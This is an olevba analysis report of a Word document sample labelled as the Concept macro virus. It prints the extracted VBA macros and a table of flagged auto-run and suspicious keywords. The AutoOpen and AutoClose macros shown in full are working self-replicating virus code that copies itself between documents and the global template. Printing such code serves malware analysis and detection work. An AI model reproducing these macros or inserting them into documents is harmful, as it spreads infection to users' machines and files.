olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept.dl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Macro1()
Attribute Macro1.VB_Description = "Macro recorded 15/03/99 by PU Sumbawa"
Attribute Macro1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro1"
'
' Macro1 Macro
' Macro recorded 15/03/99 by PU Sumbawa
'
    CommandBars("Stop Recording").Visible = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
On Error GoTo -1: On Error GoTo done
WordBasic.FileSaveAs Name:=sMe$, Format:=1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
sTMacro$ = sMe$ + ":MMIN"
WordBasic.MacroCopy "Global:Info", sTMacro$
sTMacro$ = sMe$ + ":MMFP"
WordBasic.MacroCopy "Global:FilePrint", sTMacro$
sTMacro$ = sMe$ + ":MMFT"
WordBasic.MacroCopy "Global:FileTemplates", sTMacro$
sTMacro$ = sMe$ + ":MMTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
WordBasic.FileSaveAll 1, 1
WordBasic.Call "info"
done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Info.bas 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/Info'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FilePrint.bas 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/FilePrint'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Changes the active template and the template options"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.MMFT.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileTemplates(False)
WordBasic.CurValues.FileTemplates dlg
On Error GoTo -1: On Error GoTo Selesai
WordBasic.Dialog.FileTemplates dlg
WordBasic.FileTemplates dlg
Selesai:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
On Error GoTo -1: On Error GoTo done
WordBasic.FileSaveAs Name:=sMe$, Format:=1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy sTMacro$, "Global:AutoOpen"
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy sTMacro$, "Global:AutoClose"
sTMacro$ = sMe$ + ":MMIN"
WordBasic.MacroCopy sTMacro$, "Global:Info"
sTMacro$ = sMe$ + ":MMFP"
WordBasic.MacroCopy sTMacro$, "Global:FilePrint"
sTMacro$ = sMe$ + ":MMFT"
WordBasic.MacroCopy sTMacro$, "Global:FileTemplates"
sTMacro$ = sMe$ + ":MMTM"
WordBasic.MacroCopy sTMacro$, "Global:ToolsMacro"
WordBasic.FileSaveAll 1, 1
WordBasic.Call "info"
done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Concept.dl - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

